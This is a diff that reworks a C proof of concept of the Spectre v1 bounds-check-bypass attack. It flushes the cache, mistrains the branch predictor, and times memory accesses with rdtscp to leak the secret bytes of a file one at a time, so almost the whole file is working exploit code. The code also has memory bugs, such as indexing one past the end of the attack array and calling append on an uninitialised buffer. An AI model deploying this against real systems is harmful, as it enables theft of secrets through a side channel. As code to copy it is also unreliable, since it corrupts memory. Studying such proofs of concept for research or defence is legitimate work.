@@ -1,77 +1,55 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
-#include <png.h>
-#include <stdarg.h>
 #include <stdbool.h>
 #include <string.h>
-#include <stdio.h>
-#include <errno.h>
-#include <string.h>
-#include <stdlib.h>
-#include <stdarg.h>
+#include <x86intrin.h> 
 
-#ifdef _MSC_VER
-#include <intrin.h> /* for rdtscp and clflush */
-#pragma optimize("gt", on)
-#else
-#include <x86intrin.h> /* for rdtscp and clflush */
-#endif
 void append(char* s, char c) {
-        int len = strlen(s);
-        s[len] = c;
-        s[len+1] = '\0';
+    int len = strlen(s);
+    s[len] = c;
+    s[len+1] = '\0';
 }
 
-/*
-VICTIM CODE
-*/
+#define L3_CACHE_ACCESS 80
 unsigned int arr1_size = 16;
-
-uint8_t arr1[160] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
-
+uint8_t arr1[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
 uint8_t arr2[256 * 512];
+bool attack[100];                //Boolean array to hold each try results, If TRUE then attack ELSE misstrain again.
+int results[256];                //Holds the results for each character.
 
-const char *readimage()
-
+const char *readimage(char *filename)
 {
-    FILE *fp;
-    long lSize;
-    char *buffer;
+    FILE *fp = fopen(filename, "rb");
+    if (!fp) {
+        perror("input.txt");
+        exit(1);
+    }
 
-    fp = fopen("input.txt", "rb");
-    if (!fp)
-        perror("input.txt"), exit(1);
-
+    // Find out the size of the file by going to its end and reporting the offset from the beginning in bytes
     fseek(fp, 0L, SEEK_END);
-    lSize = ftell(fp);
+    long size = ftell(fp);
     rewind(fp);
 
-    /* allocate memory for entire content */
-    buffer = calloc(1, lSize + 1);
-    if (!buffer)
-        fclose(fp), fputs("memory alloc fails", stderr), exit(1);
+    // allocate memory for entire content
+    char *buffer = calloc(1, size + 1);
+    if (!buffer) {
+        fclose(fp);
+        perror("calloc");
+        exit(1);
+    }
 
-    /* copy the file into the buffer */
-    if (1 != fread(buffer, lSize, 1, fp))
-        fclose(fp), free(buffer), fputs("entire read fails", stderr), exit(1);
+    // copy the file into the buffer 
+    if (1 != fread(buffer, size, 1, fp)) {
+        fclose(fp);
+        free(buffer);
+        fputs("entire read fails", stderr);
+        exit(1);
+    }
 
-    /* do your work here, buffer is a string contains the whole text */
     fclose(fp);
     return (buffer);
 }
-
-
-/*
-ATTACKING CODE
-*/
-
-// GLOBAL PARAMETERS
-#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */ //As set in the Research Paper.
-bool attack[100];                //Boolean array to hold each try results, If TRUE then attack ELSE misstrain again.
-int results[256];                //Holds the results for each character.
-int char_patern[256];            //Random ASCII Char.
-int train_loops = 100;          //No of tries.
 
 
 /* 
@@ -85,78 +63,97 @@ int fetch_victim(size_t index)
     {
         return arr2[arr1[index] * 512];
     }
-    else
-    {
-        return -1;
-    }
+    return -1;
 }
 
 // Phase 1 - Misstrain processor by feeding processes. (e.g. Manipulating the cache state to remove data that the processor will need to determine the actual control flow.)
 //         - Prepare for side-channel attack. In our case init arrays to hold the timing attack results(e.g. perform flush or evict part of a Flush+Reload or Evict-Reload attack.)
 
-void misstrain_proc(size_t target_idx, int tries)
+void train_branch_predictor(size_t target_idx, int tries)
 {
-    int i, j;
-    size_t train_idx, idx;
     // Flush the arr2 out of cache memory
-    for (i = 0; i < 256; i++)
+    for (size_t i = 0; i < 256; i++)
     {
         _mm_clflush(&arr2[i * 512]);
     }
 
+    // Note that this might be a little overkill, since the entire array fits into a cache line, but better safe than sorry
+    for (size_t i = 0; i < 16; i++) {
+        _mm_clflush(&arr1[i]);
+    }
+
     // Training idx is the correct idx that is within arr1_size, which will train the branch predictor that brach is mostly taken
-    train_idx = tries % arr1_size;
+    size_t train_idx = tries % arr1_size;
     //Repeat 100 times the misstrain and attack
-    for (i = 100 - 1; i >= 0; i--)
+    for (size_t i = 100; i > 0; i--)
     {
         _mm_clflush(&arr1_size);
-        // This loop executes the delay inbetween the successive training loops
-        for (j = 0; j < 100; j++)
-        {
-            ;
-        }
+        // This loop executes the delay inbetween the successive training loops. We tested _mm_lfence() as the paper says,
+        // but it does not work
+        for (size_t j = 0; j < 100; j++);
 
-        //idx = (i % 6) ? train_idx : target_idx;
         //We should avoid the if-else condition here, as the if-else invokes the use of branch predictor here, which will then detect our logic here
-        idx = attack[i] * target_idx + (!attack[i]) * train_idx;
+        size_t idx = attack[i] * target_idx + (!attack[i]) * train_idx;
+        // We don't want to have any extraneous data available to make predictions off of. Once again, might be overkill, but the exploit is touchy enough that this might be required.
+        _mm_clflush(&target_idx);
+        _mm_clflush(&train_idx);
 
         /* Call the victim function with the training_x (to mistrain branch predictor) or target_x (to attack the SECRET address) */
         fetch_victim(idx);
     }
 }
 
+// Unsigned long long is just too long to type for a single type name
+typedef unsigned long long ull;
+
+/* time_l3_access - after the branch predictor training is complete, we time how long 
+ * it takes to access certain elements of the array, and based on the timing, we then
+ * know where 
+ *
+ */
+ull time_l3_access(size_t idx) {
+    // We need this as a throwaway variable to hold the result of the register that RDTSCP returns
+    unsigned int noop = 0;
+    // Start the timer in cycles
+    register ull start = __rdtscp(&noop);
+    // Then we try to access the value from that particular page
+    noop = arr2[idx * 512];
+    // After the value access, we check the number of cycles that elapsed
+    register ull delta = __rdtscp(&noop) - start;
+    return delta;
+}
+
 // Overall attack function.
-void readMemoryByte(size_t target_idx, uint8_t value[2], int score[2])
+char read_byte(size_t target_idx)
 {
     int j, k;
-    unsigned int junk = 0;
-    int i, mix_i = 0;
-    volatile uint8_t *addr;
-    register uint64_t time1, time2;
 
     // Initializing the results array
     memset(results, 0, sizeof(results));
 
-    for (int tries = 1000 - 1; tries > 0; --tries)
+    for (int tries = 250; tries > 0; --tries)
     {
         // First misstrain the proccesor.
-        misstrain_proc(target_idx, tries);
+        train_branch_predictor(target_idx, tries);
 
         //Side channel attack to retrieve the data.
-        for (i = 0; i < 256; i++)
+        for (size_t i = 0; i < 256; i++)
         {
-            mix_i = ((i * 167) + 13) & 255;
-            addr = &arr2[mix_i * 512];
-            time1 = __rdtscp(&junk);         /* READ TIMER */
-            junk = *addr;                    /* MEMORY ACCESS TO TIME */
-            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != arr1[tries % arr1_size])
-                results[mix_i]++; /* cache hit - add +1 to score for this value */
+            size_t mix_i = ((i * 167) + 13) & 255;
+            ull delta = time_l3_access(mix_i);
+
+            // We note that we have no way of checking if the first 16 characters 
+            // are loaded. Since we are only loading base64-encoded strings for memory,
+            // this does not matter for our example, but it would be important to 
+            // do so if we were to aim to scan the whole address space.
+            if (delta <= L3_CACHE_ACCESS && mix_i != arr1[tries % arr1_size]) {
+                results[mix_i]++; 
+            }
         }
 
         /* Locate highest & second-highest results results tallies in j/k */
         j = k = -1;
-        for (i = 0; i < 256; i++)
+        for (size_t i = 0; i < 256; i++)
         {
             if (j < 0 || results[i] >= results[j])
             {
@@ -173,34 +170,23 @@ void readMemoryByte(size_t target_idx, uint8_t value[2], int score[2])
             break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
         }
     }
-    // Store the results.
-    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
-    value[0] = (uint8_t)j;
-    score[0] = results[j];
-    value[1] = (uint8_t)k;
-    score[1] = results[k];
+
+    return (char) j;
 }
 
 int main()
 {
-	printf("Training branch predictor... \n");
-    const char *secret = readimage();
-    //printf("S=  %s", secret);
+    const char *secret = readimage("input.txt");
 
+    // If we were doing a full scan of the address space, this could be any value 
+    // past the beginning of the array, but this is sufficient for our purposes.
     size_t malicious_x = (size_t)(secret - (char *)arr1);
-    int i, score[2], len = strlen(secret);
-    uint8_t value[2];
+    size_t len = strlen(secret);
 
     //set all values of array 2 as 1
     for (size_t i = 0; i < sizeof(arr2); i++)
     {
         arr2[i] = 1; /* write to arr2 so in RAM not copy-on-write zero pages */
-    }
-
-    /* Here the char pattern array is initiated*/
-    for (int i = 0; i < 256; ++i)
-    {
-        char_patern[i] = i;
     }
     /* Here the bool values , for whether to attack or mistrain is set. 1 in every 10 will attack. */
     for (int i = 0; i < 100; i += 10)
@@ -208,33 +194,20 @@ int main()
         attack[i] = true;
     }
 
-    //printf("Reading %d bytes:\n", len);
-    char str[strlen(secret) * sizeof(double)];
-    //printf("Size of %lu", sizeof(str) / sizeof(double)); 
-	printf("Retrieving cashe state...\n");
-    while (--len >= 0)
+    char str[len * sizeof(double)];
+    for (size_t i = 0; i <= len; i++)
     {
-        // printf("Reading at malicious_x = %p... ", (void *)malicious_x);
-        readMemoryByte(malicious_x++, value, score);
-        
-        if (value[0] > 31 && value[0] < 127)
+        char base64 = read_byte(malicious_x++);
+        if (base64 > 31 && base64 < 127)
         {
-		append(str, value[0]);
-	}else
-	{
-				uint8_t def[2] =  "A";
-		append(str,def[0]);
-	}
-
-        // if (score[1] > 0)
-        // {
-        //     printf("(second best: 0x%02X score=%d)", value[1], score[1]);
-        //     printf("\n");
-        // }
+            append(str, base64);
+        } else {
+            append(str, 'A');
+        }
     }
-    //printf("%s", str);
+
     FILE *f = fopen("output.txt", "w");
-    if (f == NULL)
+    if (!f)
     {
         printf("Error opening file!\n");
         exit(1);
@@ -242,5 +215,5 @@ int main()
     fprintf(f, "%s\n", str);
     fclose(f);
 
-    return (0);
+    return 0;
 }
